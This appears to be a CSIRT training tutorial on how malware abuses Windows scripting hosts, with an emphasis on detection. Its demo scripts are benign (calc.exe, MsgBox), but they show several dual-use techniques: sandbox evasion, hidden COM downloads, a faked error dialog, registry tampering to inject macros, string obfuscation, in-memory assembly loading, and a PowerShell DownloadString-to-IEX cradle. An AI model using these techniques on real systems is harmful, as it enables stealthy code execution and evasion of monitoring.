# Review of Windows Scripting Technologies

Scripts are plain text files containing instructions describing how to accomplish a set of tasks.  A script host is a program that reads these instructions and executes them on the system.  By integrating loops, conditional statements, and control statements, both system administrators and malware authors are able to use scripting to automate actions on a system.  

Understanding how each scripting technology can be used is essential for analyzing and countering adversary operations.  Incident responders need to know which processes are used to host the different types of scripts and the different ways each scripting technology can be used to interact with the OS.

|Technology|Script Host|File Types|Access Types|
|-|-|-|-|
|[Batch Files](#batch-files)|`cmd.exe`|`.bat` `.cmd` `.btm`|CLI|
|[VBScript/JScript](#vbscript-and-jscript)|`wscript.exe` `cscript.exe`|`.vbs` `.vbe` `.js` `.jse` `.hta` `.wsf` `.sct`|COM, .NET, WinAPI|
|[Visual Basic for Applications](#visual-basic-for-applications)|`winword.exe` `excel.exe` `powerpnt.exe`|`.docm` `xlsm` `.pptm`|COM, .NET, WinAPI|
|[PowerShell](#powershell)|`powershell.exe` `powershell_ise.exe` or other non-traditional processes|`.ps1` `.psm1` `.psd1`|CLI, COM, .NET, WinAPI|

<br>

This document will review:

- [Batch Files](#batch-files)
- [VBScript/JScript](#vbscript-and-jscript)
	- [Hidden COM Objects](#hidden-com-objects)
	- [Script Encoding](#script-encoding)
	- [Using Containers](#using-containers)
	- [DotNet Assembly Loading](#dotnet-assembly-loading)
- [Visual Basic for Applications](#visual-basic-for-applications)
	- [WinAPI Access](#winapi-access)
	- [Containers for VBA](#containers-for-vba)
	- [Code Obfuscation](#code-obfuscation)
- [PowerShell](#powershell)
	- [Running DotNet Assemblies](#running-dotnet-assemblies)
	- [Loading From the Network](#loading-from-the-network)
	- [Code Obfuscation](#code-obfuscation)
	- [Unmanaged PowerShell](#unmanaged-powershell)

<br>


## Batch Files

A batch file contains a list of commands that are executed one by one using the Windows command line interpreter `cmd.exe`.  The `@` symbol prevents the command that runs from being displayed when executed.  `ECHO OFF` turns off prompt permanently. 

The batch file `sbdetect.bat` checks for the presence of a specific file before executing its intended command:

```bat
@ECHO OFF

SET file="C:\email.doc" 

dir %file% > nul 2>nul

if %ERRORLEVEL% EQU 0 (
	ECHO %file% exists 
	ECHO This is a sandbox
	ECHO Exiting!
	Exit
) ELSE (
	ECHO %file% does not exist
	ECHO Proceeding with infection
	ECHO Starting calc...
	calc.exe
	Exit
)
```

<br>

If the file is not found, the "calc.exe" command executes:

![](images/Review%20of%20Windows%20Scripting%20Technologies/image001.png)<br><br>

If the file is found, the "calc.exe" command does not execute:

![](images/Review%20of%20Windows%20Scripting%20Technologies/image002.png)<br><br>

Keep in mind, PowerShell can be used to pipe the contents of a text file to `cmd.exe` so that it executes as a batch file:

![](images/Review%20of%20Windows%20Scripting%20Technologies/image003.png)<br><br>

Logs show host process `cmd.exe` being created with the batch file as an argument:

![](images/Review%20of%20Windows%20Scripting%20Technologies/image004.png)<br><br>


Batch files can perform a wide range of tasks using the command line interface (CLI) but the Windows Scripting Host (WSH) can host multiple scripting languages while also leveraging COM Objects which provides a superior scripting environment.


## VBScript and JScript

VBScript and JScript are scripting languages built in to Windows operating systems. They were initially client-side scripting languages for Internet Explorer without the capability for file managment tasks.  Later, Windows Scripting Host (WSH) was introduced to allow scripting for outside the browser to support system administration. The console-based script host is `cscript.exe` and the windows-based script host is `wscript.exe`.


Here are a few ways scripts are used to perform malicious actions:

- [Hidden COM Objects](#hidden-com-objects)
- [Script Encoding](#script-encoding)
- [Using Containers](#using-containers)
- [DotNet Assembly Loading](#dotnet-assembly-loading)


### Hidden COM Objects

Here is a VBScript file that uses a hidden Internet Explorer COM object to download a file:

```vb.net
Dim objIE

Set objIE = CreateObject("InternetExplorer.Application")
Set s = CreateObject("WScript.Shell")

objIE.Visible = False
objIE.Navigate "https://www.sans.org"

'Wait for page to load
While objIE.ReadyState <> 4 : WScript.Sleep 100 : Wend

'Download was successful
WScript.Echo "Title of page downloaded:"
WScript.Echo objIE.document.title

'Simulate executing downloaded file
WScript.Echo "Executing calc.exe..."
s.run("calc.exe")
```

<br>

Running the VBScript file `grabfile.vbs` creates an invisible IE object which downloads a file from the Internet and then runs `calc.exe`:

![](images/Review%20of%20Windows%20Scripting%20Technologies/image005.png)<br><br>

Logs show the `cscript.exe` process is created with the VBScript file as an argument:

![](images/Review%20of%20Windows%20Scripting%20Technologies/image008.png)<br><br>


Similar actions can be accomplished using JScript:

```javascript
var ws = new ActiveXObject("WScript.Shell");
var fn = ws.ExpandEnvironmentStrings("%TEMP%") + "\\" + "abcdef.txt";
var xo = new ActiveXObject("MSXML2.XMLHTTP");
xo.onreadystatechange = function() {
  if (xo.readyState === 4) {
    var xa = new ActiveXObject("ADODB.Stream");
    xa.open();
    xa.type = 1;
    xa.write(xo.ResponseBody);
    xa.position = 0;
    xa.saveToFile(fn, 2);
    xa.close();
  };
};
try {
  xo.open("GET", "https://www.sans.org", false);
  xo.send();
  if (xo.responseText) {
  WScript.Echo("File downloaded and saved as " + fn);
  WScript.Echo("Executing calc.exe...");
     ws.Run("calc.exe", 0, 0);
  };
} catch (er) {};
```

<br>

Running the Jscript file `grabfile.js` downloads a file from the Internet and runs `calc.exe`:

![](images/Review%20of%20Windows%20Scripting%20Technologies/image007.png)<br><br>


Logs show the `cscript.exe` process is created with the JScript file as an argument:

![](images/Review%20of%20Windows%20Scripting%20Technologies/image006.png)<br><br>


### Script Encoding

VBScript/JScript files can also be encoded as `.vbe` and `.jse` files:

![](images/Review%20of%20Windows%20Scripting%20Technologies/image017.png)<br><br>

You can decrypt them using [decode-vbe.py](https://blog.didierstevens.com/2016/03/29/decoding-vbe/) or [CyberChef](https://gchq.github.io/CyberChef/#recipe=Microsoft_Script_Decoder()):

![](images/Review%20of%20Windows%20Scripting%20Technologies/image018.png)<br><br>


### Using Containers

VBScript and JScript can also be run from containers such as Windows Scripting Files (`.wsf`) and HTML Applications (`.hta`).

Here is a `.wsf` file that launches JScript:

```xml
<job id="Just Another Example">
	<script language="JScript">
	var s = new ActiveXObject("WScript.Shell");
	WScript.Echo("Executing calc.exe...");
	s.run("calc.exe");
</script>
</job>
```

<br>

The `cscript.exe` process runs the `.wsf` and the JScript code it contains: 

![](images/Review%20of%20Windows%20Scripting%20Technologies/image009.png)<br><br>


Logs show the `cscript.exe` process was created with the `.wsf` file as an argument:

![](images/Review%20of%20Windows%20Scripting%20Technologies/image010.png)<br><br>


This HTA file contains VBScript that creates an invisible Excel object:

```html
<html>
<head>
<script language="vbscript">
Dim objExcel, s

Set s = CreateObject("WScript.Shell")

s.popup("ERROR 0x73e9a047d43: Document failed to open.")

Set objExcel = CreateObject("Excel.Application")
objExcel.Visible = False
objExcel.DisplayAlerts = False

self.close
</script>
</head>
</html>
```

<br>

An error message is faked to convince the user that nothing in the script executed:

![](images/Review%20of%20Windows%20Scripting%20Technologies/image011.png)<br><br>


Logs show `mshta.exe` runs the HTA file:

![](images/Review%20of%20Windows%20Scripting%20Technologies/image012.png)<br><br> 


The invisible Excel object was created a few seconds later by the `svchost.exe` process (0x154):

![](images/Review%20of%20Windows%20Scripting%20Technologies/image013.png)<br><br>



### DotNet Assembly Loading

JScript and VBScript files don't normally have WinAPI access.  But if they load a .NET assembly in memory as demonstrated with [DotNetToJScript](https://github.com/tyranid/DotNetToJScript), they can directly access the Windows API.

For example, take this simple program written in C#:

![](images/Review%20of%20Windows%20Scripting%20Technologies/image019.png)<br><br>

We can compile it to an executable with the C Sharp Compiler, `csc.exe`:

![](images/Review%20of%20Windows%20Scripting%20Technologies/image020.png)<br><br>

When this program is running, we can find it on the list of processes:

![](images/Review%20of%20Windows%20Scripting%20Technologies/image021.png)<br><br>

The executable is on disk and can be examined for digital signature, file content, etc.:

![](images/Review%20of%20Windows%20Scripting%20Technologies/image022.png)<br><br>

A .NET assembly like this can be embedded into a JScript file using serialization.  The `GoTeam.js` file contains the entire .NET assembly in the `serialized_obj` variable:

![](images/Review%20of%20Windows%20Scripting%20Technologies/image024.png)<br><br>

When the script runs the embedded program, a separate process named `GoTeam.exe` cannot be found and the executable is not on disk:

![](images/Review%20of%20Windows%20Scripting%20Technologies/image023.png)<br><br>

This is because the serialized executable was decoded, deserialized, and made to run in memory inside the `cscript.exe` process.

Adding a few lines of code will allow this program to use the [GetCurrentProcessId](https://msdn.microsoft.com/en-us/library/windows/desktop/ms683180.aspx) and [GetCurrentThreadId](https://msdn.microsoft.com/en-us/library/windows/desktop/ms683183.aspx) functions from `kernel32.dll`:

![](images/Review%20of%20Windows%20Scripting%20Technologies/image027.png)<br><br>

Now the .NET assembly can call WinAPI functions while running inside `cscript.exe`:

![](images/Review%20of%20Windows%20Scripting%20Technologies/image028.png)<br><br>


While VBScript and JScript must load an in-memory .NET assembly to access WinAPI functions, Visual Basic for Applications (VBA) natively has direct access to the Windows API.


## Visual Basic for Applications

VBA is an embeddable programming environment used to automate and extend the functionality of applications.  Office applications such as Word, Excel, and PowerPoint are used to host VBA code via macros.  VBA is closely related to Visual Basic, a programming language and IDE used to create stand-alone windows applications.

Here are a few ways VBA is used to perform malicious actions:

- [WinAPI Access](#winapi-access)
- [Containers for VBA](#containers-for-vba)
- [Code Obfuscation](#code-obfuscation)


### WinAPI Access

In VBA code, when the Windows API is used, the API call is declared at the top:

```vb.net
Declare Function GetCurrentProcessId Lib "kernel32" () As Integer 
```

<br>

And then called in the code below:

```vb.net
Dim z As Integer
z = GetCurrentProcessId() 
```

<br>

This is VBA code that calls the `GetCurrentProcessId` function from `kernel32.dll` and prints it to the screen via a popup message:

```vb.net
Declare Function GetCurrentProcessId Lib "kernel32" () As Integer
Sub mymacro()
Dim z As Integer
z = GetCurrentProcessId()
MsgBox z
End Sub
```

<br>

The VBA code must be launched from within a host process which requires putting it in a container.


### Containers for VBA

VBA code is traditionally launched from an Office document but can also use other filetypes as containers such as this VBScript file `ExecuteMacro.vbs` which creates a hidden Office object, adds a macro to it, and runs it:

```vb.net
Dim objWord, s, RegPath, action, objDocument, xlmodule

' Create hidden Word object
Set objWord = CreateObject("Word.Application")
objWord.Visible = False
Set s = CreateObject("WScript.Shell")

' Ensure required registry keys are set
function RegExists(regKey)
	on error resume next
	s.RegRead regKey
	RegExists = (Err.number = 0)
end function
RegPath = "HKEY_CURRENT_USER\Software\Microsoft\Office\15.0\Word\Security\AccessVBOM"
if RegExists(RegPath) then
	action = s.RegRead(RegPath)
else
	action = ""
end if
s.RegWrite RegPath, 1, "REG_DWORD"

' Add macro
Set objDocument = objWord.Documents.Add()
Set xlmodule = objDocument.VBProject.VBComponents.Add(1)
strCode = "Declare Function GetCurrentProcessId Lib "&Chr(34)&"kernel32"&Chr(34)&" () As Integer"&Chr(10)&"Sub mymacro()"&Chr(10)&"Dim z As Integer"&Chr(10)&"z = GetCurrentProcessId()"&Chr(10)&"MsgBox z"&Chr(10)&"End Sub"
xlmodule.CodeModule.AddFromString strCode
objWord.DisplayAlerts = False
on error resume next

' Run macro
objWord.Run "mymacro"
objDocument.Close False
objWord.Quit

' Reset reg key
if action = "" then
	s.RegWrite RegPath, action, "REG_DWORD"
end if
```

<br>

When the VBA code runs, it uses the Windows API to find its own PID:

![](images/Review%20of%20Windows%20Scripting%20Technologies/image014.png)<br><br>

Logs show the `.vbs` file being executed by `wscript.exe`:

![](images/Review%20of%20Windows%20Scripting%20Technologies/image016.png)<br><br>

But the `winword.exe` process created by the file is actually started by the `svchost.exe` process (0x154):

![](images/Review%20of%20Windows%20Scripting%20Technologies/image015.png)<br><br>

Strings such as `WScript.Shell`, `.Run`, and `kernel32` are obvious indications of malicious VBA code.  Many times all or parts of the code are obfuscated to conceal the code's true functionality.

### Code Obfuscation

The VBA code can be obfuscated in a number of ways to prevent tool detection and analysis.  The following is the same VBA code from above that has been modified with string splits and ASCII character code substitutions:

```
strCode = "De"&Chr(99)&"l"&Chr(97)&"re Fun"&Chr(99)&"ti"&Chr(111)&"n G" _
	&Chr(101)&"t"&Chr(67)&"ur"&Chr(114)&"entP"&Chr(114)&"oces"&Chr(115)&"Id Lib " _
	&Chr(34)&"ker"&Chr(110)&"el"&Chr(51)&"2"&Chr(34)&" () A"&Chr(115)&" In"&Chr(116)&"eg" _
	&Chr(101)&"r"&Chr(10)&"Su"&Chr(98)&" mym"&Chr(97)&"cro()"&Chr(10)&"Di"&Chr(109)&" z " _
	&Chr(97)&"s In"&Chr(116)&"eg"&Chr(101)&"r"&Chr(10)&"z =Ge"&Chr(116)&"Cur"&Chr(114)&"en" _
	&Chr(116)&"Pr"&Chr(111)&"ce"&Chr(115)&"sId()"&Chr(10)&"M"&Chr(115)&"g"&Chr(66)&"ox z" _
	&Chr(10)&"E"&Chr(110)&"d "&Chr(83)&"ub"
```

<br>

Take the obfuscated code above, put it in the `strCode` variable of `ExecuteMacro.vbs`, and you'll see it still executes exactly the same:

![](images/Review%20of%20Windows%20Scripting%20Technologies/image040.png)<br><br>

For malicious VBA code to run inside an Office application, Microsoft Office must be installed.  This limits the number of systems that will be affected by malware that utilizes VBA code since Office is not installed by default.  For this reason, many types of malware target the script host `powershell.exe` which is installed on all modern Windows systems.

## PowerShell

PowerShell is a command-line shell and scripting language resulting from the evolution of interactive system administration tools for Windows.

|Tool|Interactive Environment|Scripting Environment|Command-Line Tools|COM Objects|.NET|
|-|-|-|-|-|-|
|Command Prompt|Yes|Yes|No|No|No|
|Windows Script Host|No|Yes|Yes|Yes|No|
|VBA|No|Yes|Yes|Yes|Yes|
|PowerShell|**Yes**|**Yes**|**Yes**|**Yes**|**Yes**|

<br>

PowerShell has a wide range of capabilities including remote administration, Active Directory lookups, WMI queries, COM object interaction, access to the .NET Framework, and WinAPI access using in-line compiled C# ([Platform Invoke](https://www.pinvoke.net/)) or [PSReflect](https://github.com/mattifestation/PSReflect).  

Here are a few ways PowerShell is used to perform malicious actions:

- [Running DotNet Assemblies](#running-dotnet-assemblies)
- [Loading From the Network](#loading-from-the-network)
- [Code Obfuscation](#code-obfuscation)
- [Unmanaged PowerShell](#unmanaged-powershell)


### Running DotNet Assemblies

PowerShell is built upon the .NET Framework so it can call .NET methods such as `Load()` which allows an executable to be loaded and run in memory.  This capability is commonly used to run untrusted programs in memory within the trusted `powershell.exe` host process.

To demonstrate, first try loading the `GoTeam_api.exe` file from disk and running it:

```powershell
# Read the bytes of the file into memory
$bytes = [System.IO.File]::ReadAllBytes("c:\GoTeam_api.exe")

# Convert bytes to Base64
$Base64String = [System.Convert]::ToBase64String($bytes)

# Load the file and run in memory
[System.Reflection.Assembly]::Load([System.Convert]::FromBase64String($Base64String)).EntryPoint.Invoke($Null, $Null)
```

<br>

The .NET assembly runs in memory inside the PowerShell process:

![](images/Review%20of%20Windows%20Scripting%20Technologies/image029.png)<br><br>

Instead of loading the file from disk, we can also load the file from a variable in a script.  The `GoTeam_api.ps1` script contains the compressed, Base64-encoded `GoTeam_api.exe` program and upon execution will decode the program, load it into memory, and run it:

![](images/Review%20of%20Windows%20Scripting%20Technologies/image031.png)<br><br>

If you take a clean system, move the `.ps1` script to it and execute it, the only instance of the untrusted executable is the one running in memory.  So even if AV/EDR has a signature for that executable, it will not detect it unless it can somehow find it in memory or decode/decompress the variable in the script that contains the executable.

But PowerShell also has a way of keeping the script in-memory...


### Loading From the Network

Now we'll take the same technique but load the file into memory from over the network, without storing anything to disk.  The following PowerShell one-liner will be used:

```powershell
(New-Object Net.WebClient).DownloadString("http://10.0.0.100:8000/GoTeam_api.ps1") | IEX
```

<br>

This command downloads the `GoTeam_api.ps1` script into memory and runs it with Invoke-Expression (IEX).

To demonstrate, host the `GoTeam_api.ps1` script on your Ubuntu host by placing it in the `/tmp` directory and typing in the console `cd /tmp && python -m SimpleHTTPServer`.  This will start a Python web server running out of the `/tmp` directory allowing you to make a HTTP request for the file with your Windows host.

Make sure to substitute `10.0.0.100` with the IP address of your Ubuntu host.

When the PowerShell command is run, the script is downloaded into memory and begins running the embedded .NET program:

![](images/Review%20of%20Windows%20Scripting%20Technologies/image030.png)<br><br>

Neither the `GoTeam_api.ps1` script or the `GoTeam_api.exe` program are available for inspection on disk, but are able to run in memory inside the `powershell.exe` process.

The most common scenario involving this technique is a client application that starts a PowerShell process to run the command.  To simulate this, kill all `powershell.exe` processes , open `cmd.exe` and create a PowerShell process to run the command with:

```
powershell -c "(New-Object Net.WebClient).DownloadString('http://10.0.0.100:8000/GoTeam_api.ps1') | IEX"
```

<br>

This can even be performed while making the PowerShell window hidden, but evidence of the files running can still be found in Process Creation logs:

![](images/Review%20of%20Windows%20Scripting%20Technologies/image032.png)<br><br>

And transcript logging:

![](images/Review%20of%20Windows%20Scripting%20Technologies/image033.png)<br><br>

To get around this, malware can encode and obfuscate the commands it passes to `powershell.exe`.


### Code Obfuscation

The tool [Invoke-Obfuscation](https://github.com/danielbohannon/Invoke-Obfuscation) is the best way to demonstrate the many different obfuscation techniques available in PowerShell.  

To try it, clone the repo and import using:

```powershell
git clone https://github.com/danielbohannon/Invoke-Obfuscation.git
Import-Module .\Invoke-Obfuscation\Invoke-Obfuscation.psd1
Invoke-Obfuscation
```

<br>

Here are the options:

![](images/Review%20of%20Windows%20Scripting%20Technologies/image034.png)<br><br>

Depending on how many layers of obfuscation are used, you may be able to recognize parts of the original command:

![](images/Review%20of%20Windows%20Scripting%20Technologies/image035.png)<br><br>

Adding the hex encoding option gets rid of all original syntax:

![](images/Review%20of%20Windows%20Scripting%20Technologies/image036.png)<br><br>

Many more layers of obfuscation can be added but we'll stop here for this example.

Now when we pass `powershell.exe` the obfuscated command, it executes as intended:

![](images/Review%20of%20Windows%20Scripting%20Technologies/image039.png)<br><br>

But the command that ran is no longer recognizable in the Security logs:

![](images/Review%20of%20Windows%20Scripting%20Technologies/image037.png)<br><br>

Or the transcript logs:

![](images/Review%20of%20Windows%20Scripting%20Technologies/image038.png)<br><br>

This is why the presence of multiple, obfuscated PowerShell commands is many times caused by malware attempting to hide the commands which it is running on the victim system.

This in itself is another indicator that can be used to identify malware.  To avoid detection in this way, malware can migrate to a non-PowerShell process and run PowerShell commands that will not be logged.  This is commonly called "Unmanaged PowerShell".


### Unmanaged PowerShell

Unmanaged PowerShell is the execution of PowerShell code in alternate or unintended host processes.  Since the PowerShell core library `System.Management.Automation.ni.dll` can be loaded into any process, any process can be made to run PowerShell code.  This technique is used by many types of malware as well as post-exploitation frameworks such as [Empire](https://github.com/EmpireProject/Empire) and [Cobalt Strike](https://www.cobaltstrike.com/).

To demonstrate, we'll use a simple program based on [Unmanaged PowerShell](https://github.com/leechristensen/UnmanagedPowerShell) and [PowerPick](https://github.com/PowerShellEmpire/PowerTools) which is a .NET assembly that creates a runspace object, uses it to run PowerShell commands it receives, and returns the results:

![](images/Review%20of%20Windows%20Scripting%20Technologies/image044.png)<br><br>

First, close all PowerShell processes, then open a Command Prompt, run the `run_powershell.exe` program, and try a few commands:

![](images/Review%20of%20Windows%20Scripting%20Technologies/image041.png)<br><br>

Pass the program the `Start-Sleep` cmdlet and use a tool such as [Process Explorer](https://docs.microsoft.com/en-us/sysinternals/downloads/process-explorer) or [Process Hacker](https://github.com/processhacker/processhacker) to verify that no traditional PowerShell processes are running while the PowerShell command executes:

![](images/Review%20of%20Windows%20Scripting%20Technologies/image042.png)<br><br>

Use PowerShell or another tool to verify that the `run_powershell.exe` process has loaded the `System.Management.Automation.ni.dll`:

![](images/Review%20of%20Windows%20Scripting%20Technologies/image043.png)<br><br>

The most effective way to use this technique is not using an EXE on disk, but using a DLL with the same functionality that is reflectively loaded into a legitimate process. We'll explore this technique in-depth next week.


## Summary

Become familiar with scripting technologies used on Windows systems and the processes that can host them:

- Batch files use `cmd.exe` to run commands
- VBScript and JScript files can create hidden COM objects and use WinAPI functions by loading .NET assemblies in memory
- VBA code can be used to create hidden COM objects and call WinAPI functions on systems where Office is installed
- PowerShell code can run in non-traditional hosts to avoid restrictions/monitoring of traditional hosts such as `powershell.exe` and `powershell_ise.exe`

Run each of the following files at `/CSIRT/Sample-Files/scripts` and for each find one indication that untrusted code is running on the system:

	sbdetect.bat
	grabfile.vbs
	grabfile.js
	MakeExcelObject.hta
	GoTeam.exe
	GoTeam.js
	GoTeam_api.exe
	GoTeam_api.ps1
	run_powershell.exe

